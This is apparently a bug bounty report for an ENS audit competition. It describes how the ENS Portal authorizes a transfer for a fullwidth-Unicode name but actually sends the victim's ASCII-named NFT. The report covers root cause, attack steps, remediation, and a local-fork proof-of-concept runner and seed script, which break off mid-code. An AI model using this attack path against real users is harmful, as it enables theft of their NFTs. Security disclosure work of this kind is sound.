# 92111 w a critical portal authorizes a fullwidth raw ensv2 name but transfers the victim s ascii canonical twin nft

**Submitted on Sep 7th 2026 at 09:12:31 UTC by @yaohao159123 for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92111
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Direct theft of user NFTs

## Description

### Brief/Intro

An attacker can make ENS Portal authorize one ENSv2 name and execute a transfer for another. The attacker registers the byte-distinct raw label `Ｒ7m3k96vzuzcereu.eth`, while the victim owns canonical `r7m3k96vzuzcereu.eth`. After sending only the fullwidth raw NFT to the victim, the attacker directs the victim to Portal's official transfer page for `Ｒ7m3k96vzuzcereu.eth`. That route succeeds because the ownership gate checks the exact raw name.

The identity changes after that gate. Portal applies Unicode width compatibility and case folding before checking the transfer role and deriving the ERC-1155 token ID, so those operations target canonical `r7m3k96vzuzcereu.eth`. The page and transaction confirmation nevertheless continue to name raw `Ｒ7m3k96vzuzcereu.eth`. When the victim enters the attacker's address and approves the ordinary Transfer transaction, Portal calls `safeTransferFrom` for the canonical token ID. The canonical NFT and its transfer role move to the attacker, while the fullwidth raw NFT shown to the victim never leaves the victim's wallet. This is a successful application-generated wrong-asset transfer ending in NFT theft, rather than a visual homograph issue.

### Vulnerability Details

The attacker controls a route name whose raw bytes identify one registered resource but whose normalized label identifies a second registered resource. Portal carries both identities through a single transfer workflow without binding them together. Ownership authorization uses the raw resource; permission authorization and calldata use its canonical sibling; the confirmation returns to the raw spelling.

The security invariant is that every stage - ownership, transfer permission, user confirmation, and calldata - must remain attached to one exact ENS resource. The transaction plan violates that invariant before it reaches the wallet.

An executed 23-input matrix confirms where that invariant can and cannot break. Raw-leaf transformations with an unchanged ancestor registry reach the same owner/role/token split; raw TLD changes miss the exact V2 `.eth` branch, raw-parent-only changes retain the raw parent registry, and encoded-labelhash forms stop when `getLabel` rejects bracket notation. The fullwidth raw leaf crossed every extracted gate and was therefore selected for the runtime proof.

#### One-screen identity split

| Attacker-relevant stage                        | Identity selected by Portal           |
| ---------------------------------------------- | ------------------------------------- |
| Raw route used to reach the form               | raw `Ｒ7m3k96vzuzcereu.eth`            |
| Ownership gate that admits the victim          | raw `Ｒ7m3k96vzuzcereu.eth`            |
| Name presented on the page and in confirmation | raw `Ｒ7m3k96vzuzcereu.eth`            |
| Transfer-role gate                             | canonical `r7m3k96vzuzcereu.eth`      |
| ERC-1155 token ID inserted into the plan       | canonical `tokenId(r7m3k96vzuzcereu)` |
| NFT transferred by the successful transaction  | canonical `r7m3k96vzuzcereu.eth` NFT  |
| Decoy NFT remaining with the victim            | raw `Ｒ7m3k96vzuzcereu.eth` NFT        |

The raw asset is therefore useful to the attacker as an authorization and display decoy. The canonical sibling is the asset Portal actually selects at the transfer sink.

#### Demonstrated attack path

The exploit separates attacker preparation from the victim's single product interaction:

1. The victim already owns canonical `r7m3k96vzuzcereu.eth` and holds its normal transfer role.
2. The attacker registers byte-distinct raw `Ｒ7m3k96vzuzcereu.eth`. The deployed ENSv2 registrar gives this raw resource a token ID different from the canonical sibling.
3. Using only public operations over the attacker's asset, the attacker transfers the raw `Ｒ7m3k96vzuzcereu.eth` NFT to the victim. The attacker then sends the Portal route `/<fullwidth-name>/ownership/transfer` and asks the victim to return the name that appeared to have been delivered by mistake.
4. The connected victim opens that official route. Portal resolves ownership for raw `Ｒ7m3k96vzuzcereu.eth`, sees the victim as its owner, and renders the transfer form.
5. The victim supplies the attacker's recipient address and advances to confirmation.
6. Portal states `Transfer name - Ｒ7m3k96vzuzcereu.eth`, so the victim approves one wallet request intending to return that raw NFT.
7. The mined request is instead `safeTransferFrom(victim, attacker, tokenId(r7m3k96vzuzcereu), 1, 0x)`. It succeeds and gives the attacker the victim's canonical NFT.

No error or unusual recovery action alerts the victim. The path needs no failed transaction, Retry, race, stale indexer, malicious resolver, privileged initial configuration, or post-failure approval. Attacker setup is complete before contact; the victim performs the documented Transfer flow once and approves one successful transaction.

The trigger depends on a fullwidth-to-ASCII compatibility mapping: the raw first character is FULLWIDTH LATIN CAPITAL LETTER R (`U+FF32`), while the canonical first character is ASCII lowercase `r`. The two registered resources have different raw packets and token IDs even though Portal's normalization step maps the former route value to the latter label.

#### Root cause

The wrong-asset call is assembled through the following source-level identity changes:

1. `apps/portal/src/routes/$name.tsx:25-44` allows nested routes to continue for a non-normalized 2LD. A false `isValidEnsName(name)` result only prevents the TLD redirect; it does not stop the later owner lookup.
2. `apps/portal/src/routes/$name/ownership/transfer.tsx:22-27` sends the unmodified route parameter into `getEnsOwnerQueryOptions({ name })`.
3. `apps/portal/src/routes/$name/ownership/transfer.tsx:103-110` compares the connected wallet with the owner resolved for that raw route identity. This is the gate the attacker's decoy NFT satisfies.
4. `apps/portal/src/utils/ens/resolveEnsOwner.ts:44-50` passes the exact name to ENSJS v2 `getOwner`. In the pinned ENSJS code, `packetToBytes(name)` is called directly without first normalizing the string.
5. The identity then switches in `apps/portal/src/features/transfer/hooks/useCanTransferName.ts:55-73`, which calls `getLabel(name)`. At `apps/portal/src/utils/token/getLabel.ts:10-19`, `ens_normalize(name)` changes fullwidth `Ｒ7m3k96vzuzcereu.eth` into canonical label `r7m3k96vzuzcereu` before Portal evaluates the transfer role.
6. `apps/portal/src/features/transfer/hooks/useTransferName.ts:109-115` calls `getLabel(name)` again and supplies the resulting canonical label to `getEnsTokenId`. The transaction plan is therefore bound to canonical `tokenId(r7m3k96vzuzcereu)`.
7. At `apps/portal/src/features/transfer/hooks/useTransferName.ts:174-180`, the confirmation message is built from the original raw `name`, restoring the decoy identity in what the victim sees.
8. Finally, `apps/portal/src/features/transfer/helpers/transferToken.ts:63-83` encodes the already prepared canonical token ID in the registry's ERC-1155 `safeTransferFrom` call.

The same route value consequently produces two different security subjects:

```
routeName = raw Ｒ7m3k96vzuzcereu.eth
ownerSubject = packetToBytes(raw Ｒ7m3k96vzuzcereu.eth)
displaySubject = raw Ｒ7m3k96vzuzcereu.eth

label = getLabel(routeName) = canonical r7m3k96vzuzcereu
roleSubject = labelhash(canonical r7m3k96vzuzcereu)
tokenSubject = getTokenId(labelhash(canonical r7m3k96vzuzcereu))

walletCall = safeTransferFrom(victim, attacker, tokenId(canonical r7m3k96vzuzcereu), 1, 0x)
```

#### Runtime proof

The runtime witness exercised the real Portal against deployed ENSv2 bytecode on a pinned local Sepolia fork. The only function of the target-provided mock-wallet test connector was to expose the connected Anvil EOA; neither transfer selection nor execution was patched or substituted.

The witness made the identity swap observable at the UI, wallet-request, receipt, and final-state layers:

```
raw name displayed:       Ｒ7m3k96vzuzcereu.eth
canonical name:           r7m3k96vzuzcereu.eth
raw token ID:             0x4e11720eb6ae184bea8e6b6a05894c7a092fc58b906e742890e11fe100000000
canonical token ID:       0x6c56514e12a4ad42ca67202250eb2c8d3fc9da76c1e617692490a23a00000000
confirmation:             Transfer name - Ｒ7m3k96vzuzcereu.eth
submitted token ID:       canonical token ID
local transaction:        0x2301e9f647d5e488454f1d8df71ad62b1ba72f8005070405b4c2bdaf184aee2a
receipt:                  success
```

The successful receipt produced the theft state, while leaving the displayed decoy untouched:

| State                            | Before victim approval | After successful receipt |
| -------------------------------- | ---------------------: | -----------------------: |
| Victim raw-token balance         |                      1 |                        1 |
| Victim canonical-token balance   |                      1 |                        0 |
| Attacker canonical-token balance |                      0 |                        1 |
| Victim canonical transfer role   |                   true |                    false |
| Attacker canonical transfer role |                  false |                     true |

The captured wallet request decodes to selector `0xf242432a` (`safeTransferFrom`), recipient `0x70997970C51812dc3A010C7d01b50e0d17dc79C8`, amount `1`, and the canonical token ID. That ID is byte-for-byte different from the raw token ID corresponding to the name displayed throughout the interaction.

The decoded fullwidth transaction and resource identities were:

| Fullwidth runtime field              | Observed value                                                       |
| ------------------------------------ | -------------------------------------------------------------------- |
| Raw name displayed and owner-queried | `Ｒ7m3k96vzuzcereu.eth` (`U+FF32` first character)                    |
| Canonical name selected              | `r7m3k96vzuzcereu.eth`                                               |
| Raw token ID                         | `0x4e11720eb6ae184bea8e6b6a05894c7a092fc58b906e742890e11fe100000000` |
| Canonical token ID                   | `0x6c56514e12a4ad42ca67202250eb2c8d3fc9da76c1e617692490a23a00000000` |
| Confirmation                         | `Transfer name - Ｒ7m3k96vzuzcereu.eth`                               |
| Submitted token ID                   | canonical token ID                                                   |
| Local transaction                    | `0x2301e9f647d5e488454f1d8df71ad62b1ba72f8005070405b4c2bdaf184aee2a` |
| Receipt                              | success, gas used `77890`                                            |

After that receipt, the victim's raw balance remained `1`, the victim's canonical balance became `0`, and the attacker's canonical balance became `1`. The victim retained the raw transfer role but lost the canonical transfer role; the attacker gained the canonical transfer role. Browser `pageErrors` was empty.

#### Controls

Two differential controls isolate the attacker's required condition while holding Portal, the connector, the fork, the registry, and both actors constant:

1. From a canonical route, Portal displays the canonical name, prepares its matching canonical token ID, and transfers that same token successfully. This establishes the expected identity-preserving path.
2. For a raw-only token with no canonical sibling, raw ownership resolution succeeds but the normalized transfer-role gate fails. Portal reports `Transfer not available`, renders no recipient form, and emits no transaction. This establishes why the victim must also own the canonical sibling.

Together, the controls rule out a generic ERC-1155 behavior or test-harness artifact. The exploitable condition is specifically the combination of raw-resource ownership at entry and canonical-resource authorization at the transaction plan.

The execution ran both controls without changing their drivers or verifiers. The raw-only control stopped at `Transfer not available`, the canonical control transferred exactly the displayed token, and the chain verifier returned `PASS_L5_RAW_UI_CANONICAL_NFT_THEFT_R7M3K9`.

#### Recommended remediation

1. Stop non-normalized route names before any nested `$name` route or query executes, except for explicitly supported encoded-labelhash representations.
2. At route entry, create one immutable identity object containing exact name bytes, registry, resource or label hash, and versioned token ID. Carry that object through the whole operation.
3. Evaluate owner and transfer-role authority against that one resource, render the same resource to the user, and encode only the token ID already bound to it.
4. Add a final pre-wallet assertion that the displayed name resolves to exactly the token ID in the prepared call.
5. Add regressions with both `Ｒexample.eth` and `rexample.eth` registered. Portal must reject the fullwidth raw route or transfer the exact raw token it displays; it must never use that route to transfer the ASCII canonical sibling.

### Impact Details

Recommended selected impact: **Direct theft of user NFTs (Critical)**.

The victim authorizes the return of the attacker's decoy but Portal transfers the victim's canonical ENSv2 NFT. Once the successful transaction is mined, the attacker owns that NFT and receives its transfer capability. The victim retains only raw `Ｒ7m3k96vzuzcereu.eth`; that token gives no authority over canonical `r7m3k96vzuzcereu.eth`. Because both canonical ownership and the canonical transfer role have moved, the victim cannot reverse the loss with a normal `setAddr`, role edit, page reload, or second Portal transfer. Recovery depends on attacker cooperation.

The result also fits the program's Critical example involving an application that shows an incorrect name or transaction detail and thereby induces an unintended transaction. Here the UI and confirmation identify raw `Ｒ7m3k96vzuzcereu.eth`, while the prepared calldata and terminal chain state identify canonical `r7m3k96vzuzcereu.eth`. Direct NFT theft remains the primary impact because the runtime proof demonstrates the asset movement itself. No later incorrect resolution or downstream fund theft is necessary.

#### Why this differs from the disclosed input-normalization issue

The publicly disclosed input-normalization issue concerns name validators that accept deceptive characters which normalization later rejects or transforms. Its description limits practical impact to homograph-style UI confusion "rather than incorrect resolution." The present finding begins after registration, crosses an ownership/asset boundary, and ends in a successful transfer of a different NFT:

| Dimension                 | Disclosed input-normalization issue               | This finding                                                                                        |
| ------------------------- | ------------------------------------------------- | --------------------------------------------------------------------------------------------------- |
| Attacker ingress          | deceptive text accepted by a name-input validator | an already registered raw resource opened through a public nested route, without an input validator |
| Broken invariant          | validator and normalization behavior disagree     | ownership authorization and transaction construction select different registered resources          |
| Decisive source           | Manager/Explorer validators                       | owner route, role gate, token-ID preparation, and ERC-1155 transfer sink                            |
| Terminal sink             | UI confusion                                      | successful `safeTransferFrom` of the victim's other NFT                                             |
| Publicly described impact | display-only                                      | attacker receives the canonical NFT and its transfer role                                           |
| Sufficient narrow repair  | align or reject deceptive validator input         | bind authorization, display, and calldata to the same exact resource                                |

The attack does not depend on the victim overlooking the fullwidth character. Even if the victim reads `Ｒ7m3k96vzuzcereu.eth` precisely as written, Portal continues to present that exact raw name while encoding a token ID for ASCII `r7m3k96vzuzcereu.eth`.

A parent-route rejection of every non-normalized name could mitigate both behaviors, but a shared broad mitigation does not collapse a validator-only display problem into this cross-resource asset transfer. The underlying non-public report and its proposed patch were unavailable for inspection, so this distinction is limited to the program's public description.

#### Triage-facing clarifications

* **The victim sequence is ordinary, not manufactured:** The attacker handles registration and raw-token delivery in advance. The victim opens the official return-transfer route and approves one successful Transfer request.
* **The victim cannot repair the terminal state:** Canonical ownership and the corresponding transfer role end with the attacker. Possession of the raw decoy does not restore either capability.
* **The impact is not confined to text:** Decoded calldata, the successful receipt, ERC-1155 balance changes, ownership reads, and role reads independently establish movement of the wrong NFT.
* **Application transfer logic is unmodified:** All five transaction-decisive Portal files used by the PoC have the same hashes as frozen competition source. PoC components seed local state, operate the UI, capture RPC, and verify final state; they do not replace the vulnerable code.
* **The route is independently in scope:** `/$name/ownership/transfer` is a public in-scope path. It accepts the raw on-chain name through its parent and nested routes and presents the real transfer form, irrespective of dashboard inclusion.
* **Portal creates the harmful choice:** The registrar exposes two valid distinct resources, but the in-scope application chooses the canonical token ID after authorizing and displaying the raw resource.

### References

Scope and source facts:

* In-scope asset: `apps/portal` (Explorer app / Websites & Apps).
* Frozen competition source revision: `cda79acaad59711b943fc68207ebb3f1d0ff8596`.
* Public `audit-comp-ready` head checked on 2026-08-26: `1c9b47f18fcddd2e864dfe385c4171061c9811ae`.
* Public changes after the frozen revision are limited to Hono/package-manifest and lockfile updates; no public route-normalization, owner-binding, or transfer-token repair is present.
* SHA-256 values for the five decisive Portal files match between the executed checkout and frozen competition source.

Links:

* Program scope: <https://immunefi.com/audit-competition/audit-competition-ens/scope/>
* In-scope Portal: <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* Parent name route: <https://github.com/immunefi-team/audit-comp-ens/blob/audit-comp-ready/apps/portal/src/routes/%24name.tsx>
* Transfer route: <https://github.com/immunefi-team/audit-comp-ens/blob/audit-comp-ready/apps/portal/src/routes/%24name/ownership/transfer.tsx>
* Owner resolution: <https://github.com/immunefi-team/audit-comp-ens/blob/audit-comp-ready/apps/portal/src/utils/ens/resolveEnsOwner.ts>
* Transfer-role check: <https://github.com/immunefi-team/audit-comp-ens/blob/audit-comp-ready/apps/portal/src/features/transfer/hooks/useCanTransferName.ts>
* Transfer preparation: <https://github.com/immunefi-team/audit-comp-ens/blob/audit-comp-ready/apps/portal/src/features/transfer/hooks/useTransferName.ts>
* ERC-1155 transfer helper: <https://github.com/immunefi-team/audit-comp-ens/blob/audit-comp-ready/apps/portal/src/features/transfer/helpers/transferToken.ts>

## Proof of Concept

### What this PoC proves

This section is self-contained: it includes the exact runner, deployment and state-seeding program, real-browser driver, chain verifier, both differential controls, integrity manifest, and all commands needed to execute them. It does not require a personal code-hosting page, an unpublished helper, or a machine-specific path.

The distinct trigger uses FULLWIDTH LATIN CAPITAL LETTER R (`U+FF32`) in raw `Ｒ7m3k96vzuzcereu.eth`. ENS normalization maps it to canonical `r7m3k96vzuzcereu.eth`, but raw packet encoding keeps the two resources distinct. The deployed registrar on the pinned local fork accepted both labels and assigned different ERC-1155 token IDs. The real Portal admitted the victim through raw ownership, displayed the fullwidth name, and submitted one successful transfer for the canonical token.

The run used official source commit `1c9b47f18fcddd2e864dfe385c4171061c9811ae`, deployed ENSv2 bytecode at Sepolia block `11570503` (hash `0xba286ed6ee35619278654460d15d29d0b2fa90d9ed2f01f136bf083bb898839e`), Node 22, pnpm 10, Foundry Anvil/Cast 1.7.1, Python 3.14, and Playwright 1.55.0 with Chromium. The runner verifies all five transaction-decisive Portal source hashes before starting. Every transaction is mined only by local Anvil; no production Portal or live-chain write is used.

The concrete fullwidth run produced raw token ID `0x4e11720eb6ae184bea8e6b6a05894c7a092fc58b906e742890e11fe100000000`, canonical token ID `0x6c56514e12a4ad42ca67202250eb2c8d3fc9da76c1e617692490a23a00000000`, modal text `Transfer name - Ｒ7m3k96vzuzcereu.eth`, and local transaction `0x2301e9f647d5e488454f1d8df71ad62b1ba72f8005070405b4c2bdaf184aee2a`. The receipt succeeded. The victim retained the displayed raw token but lost the canonical token and its transfer role; the attacker received both.

### Reproduction steps

Prerequisites are macOS or Linux, Node 22 with pnpm 10, Foundry (`anvil` and `cast`), Python 3, Chromium support, `curl`, `lsof`, `shasum`, `rg`, and network access to fetch the official repository, dependencies, and read-only Sepolia archive state. The runner defaults to the archive endpoint that passed the pinned-block and historical-storage checks; `ENS_POC_ARCHIVE_RPC` may override it with another archive-capable endpoint.

Create a clean directory, fetch the exact official source, install dependencies, create the Python environment, save every file block in this report at the stated path, and run:

```bash
mkdir ens-fullwidth-reproduction
cd ens-fullwidth-reproduction

git init audit-comp-ens
git -C audit-comp-ens remote add origin https://github.com/immunefi-team/audit-comp-ens.git
git -C audit-comp-ens fetch --depth 1 origin 1c9b47f18fcddd2e864dfe385c4171061c9811ae
git -C audit-comp-ens switch --detach FETCH_HEAD
pnpm --dir audit-comp-ens install --frozen-lockfile

python3 -m venv .venv
.venv/bin/python -m pip install playwright==1.55.0
.venv/bin/python -m playwright install chromium

mkdir -p ens-fullwidth-poc/scripts
# Save each complete source block below under its stated relative filename.
chmod +x ens-fullwidth-poc/run-poc-r7m3k9.zsh

ENS_SOURCE_ROOT="$PWD/audit-comp-ens" \
ENS_POC_PYTHON="$PWD/.venv/bin/python" \
./ens-fullwidth-poc/run-poc-r7m3k9.zsh
```

If the current directory is already `ens-fullwidth-poc`, the same runner can be started with relative paths:

```bash
chmod +x run-poc-r7m3k9.zsh
ENS_SOURCE_ROOT=../audit-comp-ens \
ENS_POC_PYTHON=../.venv/bin/python \
./run-poc-r7m3k9.zsh
```

The runner must be saved as `ens-fullwidth-poc/run-poc-r7m3k9.zsh`:

```zsh
#!/bin/zsh
set -euo pipefail

BUNDLE_DIR=${0:A:h}
SOURCE_ROOT=${ENS_SOURCE_ROOT:-}
PYTHON=${ENS_POC_PYTHON:-python3}
ARCHIVE_RPC=${ENS_POC_ARCHIVE_RPC:-https://sepolia.gateway.tenderly.co}
ANVIL_PORT=18547
PORTAL_PORT=3102
ANVIL_RPC=http://127.0.0.1:${ANVIL_PORT}
PORTAL_URL=http://127.0.0.1:${PORTAL_PORT}
OUTPUT_DIR=${ENS_POC_OUTPUT_DIR:-${BUNDLE_DIR}/runtime-output-r7m3k9}
EVIDENCE_DIR=${OUTPUT_DIR}/evidence
LOG_DIR=${OUTPUT_DIR}/logs

if [[ -z ${SOURCE_ROOT} ]]; then
  print -u2 'Set ENS_SOURCE_ROOT to a checkout of immunefi-team/audit-comp-ens.'
  exit 1
fi
SOURCE_ROOT=${SOURCE_ROOT:A}

if [[ ! -f ${SOURCE_ROOT}/apps/portal/package.json ]]; then
  print -u2 "ENS_SOURCE_ROOT is not an audit-comp-ens checkout: ${SOURCE_ROOT}"
  exit 1
fi

for command in pnpm anvil cast curl lsof shasum cmp cp rg awk tee; do
  command -v ${command} >/dev/null 2>&1 || {
    print -u2 "Missing command: ${command}"
    exit 1
  }
done
[[ -x ${SOURCE_ROOT}/e2e/node_modules/.bin/tsx ]] || {
  print -u2 'Missing e2e dependencies. Run pnpm install --frozen-lockfile in ENS_SOURCE_ROOT.'
  exit 1
}
${PYTHON} -c 'from playwright.sync_api import sync_playwright' >/dev/null

for port in ${ANVIL_PORT} ${PORTAL_PORT}; do
  if lsof -nP -iTCP:${port} -sTCP:LISTEN >/dev/null 2>&1; then
    print -u2 "Port ${port} is already in use"
    exit 1
  fi
done

check_source_hash() {
  local expected=$1
  local relative_path=$2
  local actual
  actual=$(shasum -a 256 "${SOURCE_ROOT}/${relative_path}" | awk '{print $1}')
  [[ ${actual} == ${expected} ]] || {
    print -u2 "Unexpected audited source hash for ${relative_path}: ${actual}"
    exit 1
  }
}

# These are the transaction-decisive files from the frozen competition source.
check_source_hash 8887408c907f1430719b2b3e1a3f0d8544d7185b5e1db59e55c4a7f3864a508e apps/portal/src/features/transfer/hooks/useTransferName.ts
check_source_hash 627de3bc78ceae9e4ac56f8058bf983e2d5d5d57d9efa8ab263e6f369688b6d9 apps/portal/src/features/transfer/hooks/useCanTransferName.ts
check_source_hash 4f9e9086443571186c76e565d3ff45a952e7fb737c68c87e527515f837512a9c apps/portal/src/features/transfer/helpers/transferToken.ts
check_source_hash 44d8d116e473e146df48ae4796f4ada3c320d1d313031735245c2af91ee1518e 'apps/portal/src/routes/$name/ownership/transfer.tsx'
check_source_hash ac8cb1049e0fecb12604b7681111495dd6d2f02128ac2b542adeb95c19866444 apps/portal/src/utils/ens/resolveEnsOwner.ts

mkdir -p "${EVIDENCE_DIR}" "${LOG_DIR}"

script_names=(
  poc-raw-label-transfer-seed-r7m3k9.ts
  poc-raw-label-transfer-verify-r7m3k9.ts
  poc-raw-label-transfer-control-seed-r7m3k9.ts
  poc-raw-label-transfer-control-verify-r7m3k9.ts
)
created_scripts=()
pids=()

cleanup() {
  for pid in ${pids[@]:-}; do
    kill ${pid} >/dev/null 2>&1 || true
  done
  for port in ${ANVIL_PORT} ${PORTAL_PORT}; do
    for pid in $(lsof -nP -tiTCP:${port} -sTCP:LISTEN 2>/dev/null); do
      kill ${pid} >/dev/null 2>&1 || true
    done
  done
  for installed_script in ${created_scripts[@]:-}; do
    case ${installed_script} in
      ${SOURCE_ROOT}/e2e/scripts/*-r7m3k9.ts)
        rm -f -- "${installed_script}"
        ;;
    esac
  done
}
trap cleanup EXIT INT TERM

for script_name in ${script_names}; do
  bundled=${BUNDLE_DIR}/scripts/${script_name}
  installed=${SOURCE_ROOT}/e2e/scripts/${script_name}
  if [[ -e ${installed} ]]; then
    cmp -s "${bundled}" "${installed}" || {
      print -u2 "Existing PoC script differs: ${installed}"
      exit 1
    }
  else
    cp "${bundled}" "${installed}"
    created_scripts+=(${installed})
  fi
done

wait_rpc() {
  local attempts=0
  until curl -fsS --noproxy '*' --max-time 2 \
    -H 'content-type: application/json' \
    --data '{"jsonrpc":"2.0","id":1,"method":"eth_chainId","params":[]}' \
    ${ANVIL_RPC} >/dev/null 2>&1; do
    attempts=$((attempts + 1))
    [[ ${attempts} -lt 240 ]] || {
      print -u2 'Timed out waiting for Anvil'
      exit 1
    }
    sleep 0.5
  done
}

wait_portal() {
  local attempts=0
  until curl -fsS --noproxy '*' --max-time 2 ${PORTAL_URL} >/dev/null 2>&1; do
    attempts=$((attempts + 1))
    [[ ${attempts} -lt 480 ]] || {
      print -u2 'Timed out waiting for Portal'
      exit 1
    }
    sleep 0.5
  done
}

expected_fork_hash=0xba286ed6ee35619278654460d15d29d0b2fa90d9ed2f01f136bf083bb898839e
fork_hash=$(cast block 11570503 --field hash --rpc-url "${ARCHIVE_RPC}")
[[ ${fork_hash} == ${expected_fork_hash} ]] || {
  print -u2 "Archive RPC returned the wrong block hash: ${fork_hash}"
  exit 1
}

export NO_PROXY=127.0.0.1,localhost
export no_proxy=127.0.0.1,localhost

anvil --fork-url "${ARCHIVE_RPC}" --fork-block-number 11570503 \
  --host 127.0.0.1 --port ${ANVIL_PORT} --chain-id 11155111 --silent \
  >"${LOG_DIR}/anvil-r7m3k9.log" 2>&1 &
pids+=($!)
wait_rpc

(
  cd "${SOURCE_ROOT}"
  ANVIL_RPC_URL=${ANVIL_RPC} \
  POC_STATE_PATH=${EVIDENCE_DIR}/seed-state-r7m3k9.json \
  ./e2e/node_modules/.bin/tsx e2e/scripts/poc-raw-label-transfer-seed-r7m3k9.ts
) | tee "${LOG_DIR}/seed-r7m3k9.log"

(
  cd "${SOURCE_ROOT}"
  VITE_SEPOLIA_RPC_URL=${ANVIL_RPC} \
  VITE_USE_MOCK_WALLET=true \
  VITE_MOCK_ACCOUNT=0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266 \
  pnpm --filter portal dev --host 127.0.0.1 --port ${PORTAL_PORT}
) >"${LOG_DIR}/portal-r7m3k9.log" 2>&1 &
pids+=($!)
wait_portal

POC_STATE_PATH=${EVIDENCE_DIR}/seed-state-r7m3k9.json \
POC_ARTIFACT_DIR=${EVIDENCE_DIR} \
PORTAL_URL=${PORTAL_URL} \
"${PYTHON}" "${BUNDLE_DIR}/scripts/drive-portal-transfer-r7m3k9.py" \
  | tee "${LOG_DIR}/browser-r7m3k9.log"

(
  cd "${SOURCE_ROOT}"
  ANVIL_RPC_URL=${ANVIL_RPC} \
  POC_STATE_PATH=${EVIDENCE_DIR}/seed-state-r7m3k9.json \
  POC_VERIFY_PATH=${EVIDENCE_DIR}/chain-verification-r7m3k9.json \
  ./e2e/node_modules/.bin/tsx e2e/scripts/poc-raw-label-transfer-verify-r7m3k9.ts
) | tee "${LOG_DIR}/verify-r7m3k9.log"

(
  cd "${SOURCE_ROOT}"
  ANVIL_RPC_URL=${ANVIL_RPC} \
  POC_CONTROL_STATE_PATH=${EVIDENCE_DIR}/control-state-r7m3k9.json \
  ./e2e/node_modules/.bin/tsx e2e/scripts/poc-raw-label-transfer-control-seed-r7m3k9.ts
) | tee "${LOG_DIR}/control-seed-r7m3k9.log"

POC_CONTROL_STATE_PATH=${EVIDENCE_DIR}/control-state-r7m3k9.json \
POC_ARTIFACT_DIR=${EVIDENCE_DIR} \
PORTAL_URL=${PORTAL_URL} \
"${PYTHON}" "${BUNDLE_DIR}/scripts/drive-portal-controls-r7m3k9.py" \
  | tee "${LOG_DIR}/control-browser-r7m3k9.log"

(
  cd "${SOURCE_ROOT}"
  ANVIL_RPC_URL=${ANVIL_RPC} \
  POC_CONTROL_STATE_PATH=${EVIDENCE_DIR}/control-state-r7m3k9.json \
  POC_CONTROL_VERIFY_PATH=${EVIDENCE_DIR}/control-chain-verification-r7m3k9.json \
  ./e2e/node_modules/.bin/tsx e2e/scripts/poc-raw-label-transfer-control-verify-r7m3k9.ts
) | tee "${LOG_DIR}/control-verify-r7m3k9.log"

rg -q 'PASS_L5_RAW_UI_CANONICAL_NFT_THEFT_R7M3K9' "${LOG_DIR}/verify-r7m3k9.log"
rg -q 'PASS_CHAIN_CONTROLS_R7M3K9' "${LOG_DIR}/control-verify-r7m3k9.log"

print 'PASS_REVIEWER_PIPELINE_R7M3K9'
print "Evidence: ${EVIDENCE_DIR}"
```

A successful execution emits these seven pipeline oracles:

```
SEED_RESULT=PASS_PRECONDITIONS_R7M3K9
PASS_REAL_PORTAL_SINGLE_TRANSFER_R7M3K9
PASS_L5_RAW_UI_CANONICAL_NFT_THEFT_R7M3K9
CONTROL_SEED_RESULT=PASS_R7M3K9
PASS_NEGATIVE_AND_NORMAL_CONTROLS_R7M3K9
PASS_CHAIN_CONTROLS_R7M3K9
PASS_REVIEWER_PIPELINE_R7M3K9
```

Generated screenshots, JSON evidence, and logs appear under `ens-fullwidth-poc/runtime-output-r7m3k9/`.

### Captured exploit steps and evidence

The seed program performs all deployment-state preparation against deployed bytecode on the local fork. It clears only the two deterministic local test EOAs' forked code, funds them with locally minted test USDC, registers canonical and fullwidth raw labels, transfers the attacker's raw token to the victim, and proves the raw owner lookup and canonical transfer-role precondition. Save it as `ens-fullwidth-poc/scripts/poc-raw-label-transfer-seed-r7m3k9.ts`:

```typescript
import { readFile, writeFile } from 'node:fs/promises'
import {
  ensL1Contracts,
  extendChainWithEns,
  supportedL1Chains,
} from '@ensdomains/ensjs/chain'
import {
  getNameRegistries,
  getOwner,
  getTokenId,
  hasRoles,
} from '@ensdomains/ensjs/public/v2'
import { normalize } from '@ensdomains/ensjs/utils'
import { permissionedRegistryGetStateSnippet } from '@ensdomains/ensjs-abi/v2'
import {
  type Address,
  createPublicClient,
  createTestClient,
  createWalletClient,
  erc1155Abi,
  type Hash,
  http,
  keccak256,
  maxUint256,
  parseAbi,
  toHex,
  zeroAddress,
  zeroHash,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { sepolia } from 'viem/chains'

const rpcUrl = process.env.ANVIL_RPC_URL ?? 'http://127.0.0.1:18547'
const outputPath = process.env.POC_STATE_PATH

if (!outputPath) throw new Error('POC_STATE_PATH is required')

const localSepolia = extendChainWithEns({
  ...sepolia,
  rpcUrls: {
    default: { http: [rpcUrl] },
    public: { http: [rpcUrl] },
  },
})
const transport = http(rpcUrl)
const publicClient = createPublicClient({ chain: localSepolia, transport })
const testClient = createTestClient({
  chain: localSepolia,
  transport,
  mode: 'anvil',
})

// Account 0 is the connected victim in the Portal mock-wallet harness.
const victim = privateKeyToAccount(
  '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80',
)
const attacker = privateKeyToAccount(
  '0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d',
)
const victimClient = createWalletClient({
  account: victim,
  chain: localSepolia,
  transport,
})
const attackerClient = createWalletClient({
  account: attacker,
  chain: localSepolia,
  transport,
})

const ensjsSepolia = ensL1Contracts[supportedL1Chains.sepolia]
const registrar = ensjsSepolia.ensEthRegistrar.address
const registry = ensjsSepolia.ensRegistry.address
const usdc = ensjsSepolia.usdc.address
const registrationDuration = 28n * 24n * 60n * 60n

const registrarAbi = parseAbi([
  'function makeCommitment(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, bytes32 referrer) pure returns (bytes32)',
  'function commit(bytes32 commitment)',
  'function register(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, address paymentToken, bytes32 referrer) returns (uint256 tokenId)',
  'function getRegisterPrice(string label, uint64 duration, address paymentToken) view returns (uint256 base, uint256 premium)',
  'function MIN_COMMITMENT_AGE() view returns (uint64)',
  'function isAvailable(string label) view returns (bool)',
])
const erc20Abi = parseAbi([
  'function mint(address to, uint256 amount)',
